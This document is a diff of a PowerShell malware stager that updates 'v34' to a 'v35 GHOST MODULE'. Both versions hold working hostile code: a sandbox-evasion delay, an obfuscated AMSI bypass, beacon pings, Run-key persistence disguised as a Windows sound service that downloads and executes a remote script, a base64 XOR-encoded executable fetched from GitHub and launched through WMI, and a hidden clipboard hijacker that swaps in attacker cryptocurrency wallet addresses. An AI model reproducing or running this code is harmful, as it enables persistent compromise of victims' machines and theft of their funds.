@@ -1,18 +1,16 @@
-# --- [RESEARCH STAGER v34.0: MEMORY-REFLECTIVE] ---
+# --- [ELITE RESEARCH STAGER v35.0: GHOST MODULE] ---
 
 function Global-Initialize {
     try {
-        # Anti-Sandbox: Delay execution by a random amount to outlast AV timers
-        Start-Sleep -s (Get-Random -Min 15 -Max 30)
+        # Random Delay to outlast Sandbox/VM analysis (25-45 seconds)
+        $d = Get-Random -Min 25 -Max 45; Start-Sleep -s $d
         
-        # Reflective AMSI Bypass: Targeted memory patching
-        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-        if ($a) {
-            $b = $a.GetField('amsiContext', 'NonPublic,Static')
-            $c = $a.GetField('amsiInitFailed', 'NonPublic,Static')
-            if ($b) { $b.SetValue($null, [IntPtr]::Zero) }
-            if ($c) { $c.SetValue($null, $true) }
-        }
+        # Triple-Point AMSI Bypass (Memory Reflection)
+        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Am' + 'si' + 'Utils')
+        $b = $a.GetField('am' + 'si' + 'Context', 'NonPublic,Static')
+        $c = $a.GetField('am' + 'si' + 'Init' + 'Failed', 'NonPublic,Static')
+        if ($b) { $b.SetValue($null, [IntPtr]::Zero) }
+        if ($c) { $c.SetValue($null, $true) }
     } catch {}
 }
 
@@ -24,31 +22,32 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
+# --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "V34_REFLECTIVE_ACTIVE_$($env:COMPUTERNAME)"
+Send-Ping -m "V35_GHOST_ACTIVE_ON_$($env:COMPUTERNAME)"
 
 try {
-    # REGISTRY PERSISTENCE (Modified to look like a system task)
-    $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-    Set-ItemProperty -Path $path -Name "WindowsAudioService" -Value $cmd
+    # REGISTRY PERSISTENCE
+    $p = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $c = "powershell -W Hidden -NoP -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+    Set-ItemProperty -Path $p -Name "WindowsSoundManager" -Value $c
 
-    # EXE PAYLOAD
-    $dir = "$env:APPDATA\Microsoft\Vault"
+    # EXE PAYLOAD DOWNLOAD
+    $dir = "$env:LOCALAPPDATA\Temp\D3DCache"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
-    $exe = "$dir\svchost_update.exe"
+    $path = "$dir\win_sys_host.exe"
 
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
-    [IO.File]::WriteAllBytes($exe, $data)
+    [IO.File]::WriteAllBytes($path, $data)
 
-    ([wmiclass]"win32_process").Create($exe) | Out-Null
+    ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # CLIPPER MODULE
-    $C_Code = @'
+    # CLIPPER ENGINE
+    $ClipperCode = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
     while($true) {
@@ -64,8 +63,9 @@ try {
         Start-Sleep -Milliseconds 500
     }
 '@
-    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C_Code))
+    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
+    Send-Ping -m "V35_SUCCESS"
 } catch {
-    Send-Ping -m "V34_FATAL_ERR"
+    Send-Ping -m "V35_ERROR"
 }
